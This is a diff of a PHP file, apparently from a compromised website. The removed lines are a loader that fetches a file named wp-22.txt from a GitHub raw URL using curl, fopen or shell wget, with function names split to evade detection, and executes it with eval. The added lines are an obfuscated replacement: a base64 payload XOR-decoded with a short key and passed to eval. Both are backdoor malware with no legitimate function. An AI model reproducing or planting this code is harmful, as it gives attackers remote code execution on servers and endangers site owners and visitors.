@@ -1,74 +1,26 @@
 <?php
 
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+function a1B2C3D4($e5F6G7H8, $i9J0K1L2) {
+    $m3N4O5P6 = strlen($i9J0K1L2);
+    $q7R8S9T0 = strlen($e5F6G7H8);
+    $u1V2W3X4 = '';
 
-$url = "https://" . "raw.github" . "user" . "content.com/" . "hacker-d/new/main/wp-22.txt";
-
-$f_ab = 'curl_' . 'init';
-$f_cd = 'curl_' . 'exec';
-$f_ef = 'curl_' . 'close';
-$f_gh = 'file_' . 'get_' . 'contents';
-$f_ij = 'f' . 'open';
-$f_kl = 'f' . 'close';
-$f_mn = 'shell_' . 'exec';
-
-function get_content_from_url($url) {
-    global $f_ab, $f_cd, $f_ef, $f_gh, $f_ij, $f_kl, $f_mn;
-
-    if (function_exists($f_ab)) {
-        $ch = $f_ab();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $output = $f_cd($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $f_ef($ch);
-
-        if ($output !== false && $http_code == 200) {
-            return $output;
-        }
+    for ($y5Z6A7B8 = 0; $y5Z6A7B8 < $q7R8S9T0; $y5Z6A7B8++) {
+        $u1V2W3X4 .= $e5F6G7H8[$y5Z6A7B8] ^ $i9J0K1L2[$y5Z6A7B8 % $m3N4O5P6];
     }
 
-    if (ini_get('allow_url_fopen')) {
-        $output = @$f_gh($url);
-        if ($output !== false) {
-            return $output;
-        }
-    }
-
-    $handle = @$f_ij($url, 'r');
-    if ($handle) {
-        $output = '';
-        while (!feof($handle)) {
-            $output .= fread($handle, 8192);
-        }
-        $f_kl($handle);
-        if ($output !== false) {
-            return $output;
-        }
-    }
-
-    if (function_exists('exec') || function_exists($f_mn)) {
-        $output = @$f_mn('wget -q -O - ' . escapeshellarg($url));
-        if (!empty($output)) {
-            return $output;
-        }
-    }
-
-    return false;
+    return $u1V2W3X4;
 }
 
-$output = get_content_from_url($url);
-
-if ($output !== false) {
-    $run_code = function($code) {
-        return @eval('?>' . $code);
-    };
-
-    $run_code($output);
-} else {
-    echo "Gagal mendapatkan konten dari URL.";
+function C8D9E0F1($j2K3L4M5, $i9J0K1L2) {
+    return a1B2C3D4($j2K3L4M5, $i9J0K1L2);
 }
+
+$l6M7N8O9 = 'D704T';
+$fileName = "wp-22.txt";
+$t5U6V7W8 = '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';
+$v9X0Y1Z2 = base64_decode($t5U6V7W8);
+$k3L4M5N6 = C8D9E0F1($v9X0Y1Z2, $l6M7N8O9);
+eval('?>' . $k3L4M5N6);
 
 ?>
